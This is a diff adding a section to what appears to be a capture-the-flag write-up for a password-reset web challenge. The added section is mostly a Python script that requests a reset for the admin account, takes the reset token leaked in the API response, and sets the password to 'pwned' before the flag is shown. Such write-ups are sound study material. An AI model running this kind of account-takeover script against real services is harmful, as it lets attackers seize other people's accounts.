@@ -544,6 +544,42 @@ With this set we should be able to login with `admin@stupid-reset.com:pwned` and
 ![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/2206d454-e300-47e6-9e0f-4ac322038fdf)
 ![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/696e6454-5729-40c6-b4e4-8986262a6add)
 
+Doing this manually is pain so I made a script to automate the stress for us 
+
+```python
+#!/usr/bin/python3
+import requests
+import json
+
+email = "admin@stupid-reset.com"
+# email = "pwner@root.io"
+password = "pwned"
+proxy = {"http":"http://127.0.0.1:8080"}
+
+# Step 1: Forget password to get the token
+url = 'http://143.198.98.92:1337/api/forgot-password'
+param = {'user':{'email':email}}
+data = json.dumps(param)
+headers = {"Content-Type":"application/json"}
+res = requests.post(url, data=data, headers=headers)
+val = json.loads(res.text)
+reset_token = val['resettoken']
+
+# Step 2: Reset the user accout password
+change_to = "pwned"
+param = {"user":{"password":change_to}}
+data = json.dumps(param)
+headers = {"Content-Type":"application/json"}
+url = f'http://143.198.98.92:1337/api/reset/{reset_token}'
+res = requests.post(url, data=data, headers=headers)
+
+# Print success message
+print(f'[*] Email: {email} password has been updated to "{change_to}"')
+```
+
+Running it also works then we can login with the password and get the flag
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/0cc2799c-3049-41a0-b252-7812f0f44d9b)
+
 ```
 Flag: csean-ctf{th!s_RESET_1s_SECURE_you_should_REALly_TrusT_m3!}
 ```
